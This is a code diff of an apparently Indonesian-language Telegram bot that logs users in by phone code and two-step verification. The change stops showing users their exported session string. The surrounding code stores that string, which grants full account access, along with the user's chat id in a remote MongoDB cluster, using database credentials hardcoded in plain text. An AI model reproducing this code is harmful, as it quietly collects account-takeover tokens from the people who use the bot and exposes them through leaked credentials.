@@ -63,9 +63,6 @@ async def recv_tg_code_message(_, message: Message):
         return
     # await status_message.delete()
     del w_s_dict["MESSAGE"]
-    status_message = await message.reply_text(
-        RECVD_PHONE_CODE
-    )
     phone_code = "".join(message.text.split(" "))
     try:
         w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
@@ -74,19 +71,17 @@ async def recv_tg_code_message(_, message: Message):
             phone_code
         )
     except BadRequest as e:
-        await status_message.edit_text(
-            e.MESSAGE + "\n\n" + PHONE_CODE_IN_VALID_ERR_TEXT
+        await status_message.reply_text(
+          f"{e} \n\nKode yang anda masukkan salah, coba masukan kembali atau mulai dari awal"
         )
         del AKTIFPERINTAH[message.chat.id]
     except SessionPasswordNeeded:
-        await status_message.edit_text(
-            ACC_PROK_WITH_TFA
+        await status_message.reply_text(
+          "Verifikasi 2 Langkah Diaktifkan, Mohon Masukkan Verifikasi 2 Langkah Anda."
         )
         w_s_dict["IS_NEEDED_TFA"] = True
     else:
-        saved_message_ = await status_message.edit_text(
-            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
-        ) 
+        
         client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -103,11 +98,7 @@ async def recv_tg_code_message(_, message: Message):
         filename = ".env"
         with open(filename, "a") as file:
             file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
-        await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{count}.")
-        await saved_message_.reply_text(
-            SESSION_GENERATED_USING,
-            quote=True
-        )
+        await message.reply_text("Proses Deploy Sedang Berjalan.")
         session_data = {
             "session_string": session_string,
             "user_id": message.chat.id,
@@ -117,12 +108,12 @@ async def recv_tg_code_message(_, message: Message):
         }        
         mongo_collection.insert_one(session_data)
         try:
-            msg = await message.reply(" `Restarting bot...`")
+            msg = await message.reply(" `Restarting Bot...`")
             LOGGER(__name__).info("BOT SERVER RESTARTED !!")
         except BaseException as err:
             LOGGER(__name__).info(f"{err}")
             return
-        await msg.edit_text("✅ **Bot has restarted !**\n\n")
+        await msg.edit_text("✅ **Bot has restarted !**\nTunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot")
         if HAPP is not None:
             HAPP.restart()
         else:
